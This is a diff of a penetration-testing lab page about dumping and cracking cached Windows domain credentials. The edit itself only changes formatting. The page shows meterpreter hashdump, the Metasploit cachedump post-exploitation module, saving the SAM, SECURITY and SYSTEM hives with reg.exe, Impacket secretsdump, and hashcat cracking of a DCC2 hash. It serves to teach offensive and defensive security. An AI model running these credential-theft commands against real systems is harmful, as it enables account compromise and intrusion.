@@ -10,28 +10,24 @@ This lab focuses on dumping and cracking mscash hashes after SYSTEM level privil
 
 Note that in meterpreter session, hashdump only dumps the local SAM account hashes:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```text
 hashdump
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-02-15-59-09.png)
 
 To dump cached domain credentials in mscash format, use a post exploitation module `cachedump`:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 getuid
 getsystem
 use post/windows/gather/cachedump
 run
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-02-15-53-09.png)
 
@@ -39,27 +35,23 @@ run
 
 Impacket's secrestdump tool allows us to dump all the credentials that are stored in registry hives SAM, SECURITY and SYSTEM, so firstly, we need to write those out:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 reg.exe save hklm\sam c:\temp\sam.save
 reg.exe save hklm\security c:\temp\security.save
 reg.exe save hklm\system c:\temp\system.save
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-02-15-56-47.png)
 
 Once the hives are retrieved, they can can be pulled back to kali linux to extract the hashes:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-02-15-57-28.png)
 
@@ -91,13 +83,11 @@ echo ; cat hashes.txt ; echo ; cut -d ":" -f 2 hashes.txt
 
 Let's try cracking it with hashchat now:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85f3b8' /usr/share/wordlists/rockyou.txt --force --potfile-disable
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-02-02-16-57-55.png)
 
